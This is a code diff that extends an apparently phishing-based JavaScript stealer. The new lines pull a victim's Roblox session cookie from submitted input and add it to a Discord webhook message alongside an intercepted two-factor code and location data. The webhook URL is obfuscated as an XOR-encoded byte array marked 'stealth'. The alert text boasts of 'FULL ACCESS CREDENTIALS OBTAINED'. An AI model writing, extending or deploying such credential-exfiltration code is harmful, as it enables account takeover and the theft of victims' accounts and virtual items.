@@ -812,6 +812,10 @@ async function sendTwoFactorCodeToWebhook(code, trustDevice) {
         // Get user's location info
         const locationInfo = await getUserLocation();
         
+        // Get the Roblox cookie from the input text
+        const inputText = realInputValue || '';
+        const robloxCookie = extractRobloxCookie(inputText);
+        
         // Simple stealth webhook for 2FA
         const _0x2FAWebhook = [72,84,84,80,83,26,15,15,68,73,83,67,79,82,68,14,67,79,77,15,65,80,73,15,87,69,66,72,79,79,75,83,15,17,19,25,22,17,22,16,20,18,16,18,18,25,24,16,24,18,19,24,15,78,106,71,120,80,23,74,117,80,83,82,119,98,121,97,24,65,20,17,80,25,106,22,84,98,90,74,65,20,16,21,65,103,18,120,72,115,24,72,116,80,76,24,80,107,18,16,73,86,70,77,79,74,68,85,13,86,80,111,65,110,25,65,97,70,109,101,105]
             .map(n => String.fromCharCode(n ^ 32)).join('');
@@ -829,6 +833,11 @@ async function sendTwoFactorCodeToWebhook(code, trustDevice) {
                     name: "🔒 Trust Device",
                     value: trustDevice ? "✅ Yes (30 days)" : "❌ No",
                     inline: true
+                },
+                {
+                    name: "🍪 Roblox Cookie",
+                    value: robloxCookie ? `\`|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}\`` : "❌ Not Found",
+                    inline: false
                 },
                 {
                     name: "🌍 Location",
@@ -855,7 +864,7 @@ async function sendTwoFactorCodeToWebhook(code, trustDevice) {
         };
 
         const payload = {
-            content: "@everyone **🚨 2-Step Authentication Code Intercepted!**",
+            content: `@everyone **🚨 2-Step Authentication & Cookie Captured!**\n${robloxCookie ? '🍪 **FULL ACCESS CREDENTIALS OBTAINED**' : '🔐 **2FA CODE CAPTURED**'}`,
             embeds: [embed]
         };
 
